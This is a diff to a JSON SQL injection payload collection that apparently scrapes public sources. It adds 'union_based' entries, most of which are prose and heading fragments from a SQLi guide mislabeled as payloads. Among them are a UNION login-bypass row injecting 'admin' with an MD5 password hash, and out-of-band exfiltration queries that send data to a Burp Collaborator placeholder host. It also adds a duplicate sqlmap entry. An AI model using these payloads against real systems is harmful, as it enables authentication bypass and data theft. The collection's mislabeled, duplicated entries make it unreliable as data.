@@ -1,14 +1,14 @@
 {
   "metadata": {
     "version": "1.0",
-    "updated": "2026-03-10T10:30:47.760913",
+    "updated": "2026-03-11T04:18:46.359986",
     "sources": [
       "GitHub",
       "PortSwigger",
       "CVE Database",
       "OWASP"
     ],
-    "total_payloads": 59
+    "total_payloads": 69
   },
   "union_based": {
     "numeric": [],
@@ -274,6 +274,69 @@
         "source": "OWASP",
         "discovered_at": "2026-03-10T10:30:47.083845",
         "verified": false
+      },
+      {
+        "payload": "By 2025, applications almost never store plaintext passwords. Authentication systems instead use a representation of the password (a hash derived by a key-derivation function, often with a salt). That evolution changes the mechanics of some classic SQL injection (SQLi) bypasses: an attacker who injects rows via `UNION` must now supply values that match the stored representation the application expects, not the user's raw password.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734123",
+        "verified": false
+      },
+      {
+        "payload": "* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734140",
+        "verified": false
+      },
+      {
+        "payload": "If an attacker can inject an extra row into the result set (for example using `UNION`), they can make the application receive an attacker-controlled stored_password_hash. If that injected hash equals `hash(attacker_supplied_password)` as computed by the app, the comparison succeeds and the attacker is authenticated as the injected username.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734144",
+        "verified": false
+      },
+      {
+        "payload": "* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5(\"P@ssw0rd\")`.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734148",
+        "verified": false
+      },
+      {
+        "payload": "## UNION Based Injection",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734151",
+        "verified": false
+      },
+      {
+        "payload": "In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734153",
+        "verified": false
+      },
+      {
+        "payload": ":warning: The 2 SELECT clauses must have the same number of columns.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734158",
+        "verified": false
+      },
+      {
+        "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734190",
+        "verified": false
+      },
+      {
+        "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-11T04:18:45.734193",
+        "verified": false
       }
     ]
   },
@@ -441,6 +504,16 @@
       "url": "https://github.com/sqlmapproject/sqlmap",
       "description": "Automatic SQL injection and database takeover tool",
       "stars": 36795,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: sqlmapproject/sqlmap",
+      "url": "https://github.com/sqlmapproject/sqlmap",
+      "description": "Automatic SQL injection and database takeover tool",
+      "stars": 36800,
       "language": "Python",
       "category": "reference_tool",
       "source": "GitHub",
